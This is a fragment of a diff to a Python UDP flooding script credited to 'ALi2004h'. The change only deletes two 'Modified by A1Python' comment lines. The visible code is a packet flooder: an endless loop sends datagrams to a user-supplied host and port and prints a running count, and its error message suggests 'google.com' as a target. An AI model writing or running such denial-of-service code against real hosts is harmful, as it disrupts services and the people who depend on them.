@@ -2,7 +2,7 @@
 # Coder By ALi2004h {*Ali HemmatNia*}
 # Github : github.com/ali2004-linux
 # Version Python All Versions
-#Modifie By A1Python
+
 
 import socket
 import os
@@ -64,7 +64,7 @@ def main():
             while True:
                 s.sendto(t, (socket.gethostbyname(ip),port))
                 f +=  1
-                #Modified by A1Python
+                
                 print(f"{Fore.GREEN} [***]{Style.RESET_ALL} {Fore.WHITE} Sending Packet To{Style.RESET_ALL} {Fore.RED}{socket.gethostbyname(ip)}{Style.RESET_ALL} Port: {Fore.GREEN}{port}{Style.RESET_ALL} Count: {Fore.BLUE}[{f}]!{Style.RESET_ALL}")
         except socket.gaierror:
             print(f"{Fore.GREEN}\n   [***]  {Fore.RED}Entered DOMANIN NAME not found, You have to written like this: {Fore.MAGENTA}google.com\n{Style.RESET_ALL}")
